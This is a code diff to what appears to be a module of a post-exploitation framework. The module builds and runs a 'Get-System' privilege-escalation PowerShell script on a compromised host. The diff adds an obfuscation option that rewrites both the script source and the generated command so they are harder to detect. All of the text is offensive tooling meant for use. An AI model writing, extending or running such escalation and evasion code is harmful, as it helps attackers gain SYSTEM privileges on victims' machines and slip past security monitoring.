@@ -78,11 +78,13 @@ class Module:
                 self.options[option]['Value'] = value
 
 
-    def generate(self):
+    def generate(self, obfuscate=False, obfuscationCommand=""):
 
         # read in the common module source code
         moduleSource = self.mainMenu.installPath + "/data/module_source/privesc/Get-System.ps1"
-
+        if obfuscate:
+            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
+            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
         try:
             f = open(moduleSource, 'r')
         except:
@@ -94,23 +96,25 @@ class Module:
 
         script = moduleCode
 
-        script += "Get-System "
+        scriptEnd = "Get-System "
 
         if self.options['RevToSelf']['Value'].lower() == "true":
-            script += " -RevToSelf"
+            scriptEnd += " -RevToSelf"
         elif self.options['WhoAmI']['Value'].lower() == "true":
-            script += " -WhoAmI"
+            scriptEnd += " -WhoAmI"
         else:
             for option,values in self.options.iteritems():
                 if option.lower() != "agent":
                     if values['Value'] and values['Value'] != '':
                         if values['Value'].lower() == "true":
                             # if we're just adding a switch
-                            script += " -" + str(option)
+                            scriptEnd += " -" + str(option)
                         else:
-                            script += " -" + str(option) + " " + str(values['Value']) 
+                            scriptEnd += " -" + str(option) + " " + str(values['Value']) 
 
-            script += "| Out-String | %{$_ + \"`n\"};"
-            script += "'Get-System completed'"
-
+            scriptEnd += "| Out-String | %{$_ + \"`n\"};"
+            scriptEnd += "'Get-System completed'"
+        if obfuscate:
+            scriptEnd = helpers.obfuscate(psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
+        script += scriptEnd
         return script
